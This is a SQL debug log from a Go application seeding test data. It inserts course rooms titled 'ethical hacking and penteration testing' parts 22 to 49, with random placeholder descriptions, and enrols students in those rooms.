[0m[33m[6.418ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.023','2025-06-09 14:07:53.024',NULL,'ethical hacking and penteration testing part 22','SKbGQHktPQEUQYDwTiVRVmLtXtvARn',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.559ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[10.400ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.029','2025-06-09 14:07:53.034',NULL,'ethical hacking and penteration testing part 23','FVbcJNugKbEcfMVEMUpeBzsdOvNSPg',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[3.474ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[9.347ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.04','2025-06-09 14:07:53.044',NULL,'ethical hacking and penteration testing part 24','zpWBrZYioukCqVoAYtyXNZDVoLagCO',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[1.341ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[7.570ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.049','2025-06-09 14:07:53.051',NULL,'ethical hacking and penteration testing part 25','eSvyaSnWDPeWbkKerWzlQMOjvjtwRh',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.479ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[8.368ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.057','2025-06-09 14:07:53.058',NULL,'ethical hacking and penteration testing part 26','fvBbHjSpevbfYmxFiXGjwgIYhHqSap',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.448ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[7.923ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.065','2025-06-09 14:07:53.066',NULL,'ethical hacking and penteration testing part 27','eEqEejWYUQEpRUzOJQGIaOJKAOqrOf',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.490ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.301ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.074','2025-06-09 14:07:53.075',NULL,'ethical hacking and penteration testing part 28','uXjZArPXwlLNxsOpvqNlHnfVLNLski',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.489ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.271ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.08','2025-06-09 14:07:53.081',NULL,'ethical hacking and penteration testing part 29','IOXPVPpTEaIVofvZfGklbvdbXpwChK',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.516ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.501ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.086','2025-06-09 14:07:53.087',NULL,'ethical hacking and penteration testing part 30','ShleNvmTYHBsXqnVdQihTJOukwGORg',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.477ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.261ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.093','2025-06-09 14:07:53.094',NULL,'ethical hacking and penteration testing part 31','AXMNSRveJSvqoxiAVFiHqShqLdwkeU',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.476ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.675ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.099','2025-06-09 14:07:53.101',NULL,'ethical hacking and penteration testing part 32','FmNbIIROidgCKVPZZqpxfMSFONpCsj',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[3.925ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[11.189ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.106','2025-06-09 14:07:53.111',NULL,'ethical hacking and penteration testing part 33','NbUejmNvXJflhEqeQMIKJehxeYdIPp',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.495ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.384ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.117','2025-06-09 14:07:53.118',NULL,'ethical hacking and penteration testing part 34','yNqzqCVPhCOCSuRVakVVArgzrfuFVg',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.486ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.299ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.124','2025-06-09 14:07:53.125',NULL,'ethical hacking and penteration testing part 35','dDjBFlelTkvYYvYgGtjKFylrGRqvBk',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[2.804ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[66.206ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.13','2025-06-09 14:07:53.134',NULL,'ethical hacking and penteration testing part 36','dPSzpYvlCzXEHXHVDQnZDkJMwPhjSx',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.470ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[8.445ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.197','2025-06-09 14:07:53.198',NULL,'ethical hacking and penteration testing part 37','tfblQPWLaBdInLwzmCyFKTpKmamcWW',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.456ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.460ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.205','2025-06-09 14:07:53.206',NULL,'ethical hacking and penteration testing part 38','FczxSrmONnwXjAMzUxoyhqqkNRBVBf',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[4.644ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[10.760ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.212','2025-06-09 14:07:53.217',NULL,'ethical hacking and penteration testing part 39','qJMfkSfgIiWYyeAPCIONabYeKTMKCF',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.612ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[10.583ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.223','2025-06-09 14:07:53.224',NULL,'ethical hacking and penteration testing part 40','ZMjyYWwfpmrTRRpMZzdkLcZlCcdHqc',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.468ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.469ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.233','2025-06-09 14:07:53.235',NULL,'ethical hacking and penteration testing part 41','MbpGJOlVkHunYYdcPsIBVjIoHJXpIm',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.509ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.614ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.24','2025-06-09 14:07:53.241',NULL,'ethical hacking and penteration testing part 42','ACFOZyAVVxRhNcsDxTvhlLIrUNXiie',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.530ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.499ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.247','2025-06-09 14:07:53.248',NULL,'ethical hacking and penteration testing part 43','TIDWLJiITKBHfUwMzGJkkXQEscSyxJ',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.545ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[8.857ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.254','2025-06-09 14:07:53.257',NULL,'ethical hacking and penteration testing part 44','hQnzEDXbkJLqatDgzOXRgdilTYEPGT',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.456ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[20.679ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.263','2025-06-09 14:07:53.263',NULL,'ethical hacking and penteration testing part 45','mIxNEpQofmEBHTWKQSeCaERgTXBtCh',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.534ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[16.532ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.283','2025-06-09 14:07:53.294',NULL,'ethical hacking and penteration testing part 46','MNEpyXmVSFHGSvzvZcmKIlMJnalmLr',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.531ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[8.401ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.3','2025-06-09 14:07:53.301',NULL,'ethical hacking and penteration testing part 47','YYuaktRQtwbNPeqHRfRdEEvdSpREII',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.795ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[7.308ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.309','2025-06-09 14:07:53.31',NULL,'ethical hacking and penteration testing part 48','iUtOLpjVTwJrxYuzoxysSVqoXbhsnk',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.486ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.583ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2015-06-09 14:07:53.316','2025-06-09 14:07:53.317',NULL,'ethical hacking and penteration testing part 49','vgvbDDRwQmiSkzBMRLaCjHOSoZzytE',true,false,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.212ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.361ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomStudentModel.go:29
[0m[33m[12.481ms] [34;1m[rows:1][0m INSERT INTO "room_students" ("created_at","updated_at","deleted_at","member_id","room_id") VALUES ('2025-06-09 14:07:53.328','2025-06-09 14:07:53.328',NULL,1,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.639ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 2 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.639ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomStudentModel.go:29
[0m[33m[13.348ms] [34;1m[rows:1][0m INSERT INTO "room_students" ("created_at","updated_at","deleted_at","member_id","room_id") VALUES ('2025-06-09 14:07:53.338','2025-06-09 14:07:53.338',NULL,2,2) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.778ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 2 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.128ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomStudentModel.go:29
[0m[33m[8.162ms] [34;1m[rows:1][0m INSERT INTO "room_students" ("created_at","updated_at","deleted_at","member_id","room_id") VALUES ('2025-06-09 14:07:53.351','2025-06-09 14:07:53.351',NULL,2,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.637ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 3 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[5.039ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomStudentModel.go:29
[0m[33m[19.655ms] [34;1m[rows:1][0m INSERT INTO "room_students" ("created_at","updated_at","deleted_at","member_id","room_id") VALUES ('2025-06-09 14:07:53.363','2025-06-09 14:07:53.363',NULL,3,1) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[4.347ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 3 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.878ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 3 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomStudentModel.go:29
[0m[33m[24.396ms] [34;1m[rows:1][0m INSERT INTO "room_students" ("created_at","updated_at","deleted_at","member_id","room_id") VALUES ('2025-06-09 14:07:53.388','2025-06-09 14:07:53.388',NULL,3,3) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.643ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.765ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 4 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomStudentModel.go:29
[0m[33m[11.977ms] [34;1m[rows:1][0m INSERT INTO "room_students" ("created_at","updated_at","deleted_at","member_id","room_id") VALUES ('2025-06-09 14:07:53.403','2025-06-09 14:07:53.403',NULL,1,4) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.494ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 2 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.468ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 5 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomStudentModel.go:29
[0m[33m[8.239ms] [34;1m[rows:1][0m INSERT INTO "room_students" ("created_at","updated_at","deleted_at","member_id","room_id") VALUES ('2025-06-09 14:07:53.415','2025-06-09 14:07:53.415',NULL,2,5) RETURNING "id"

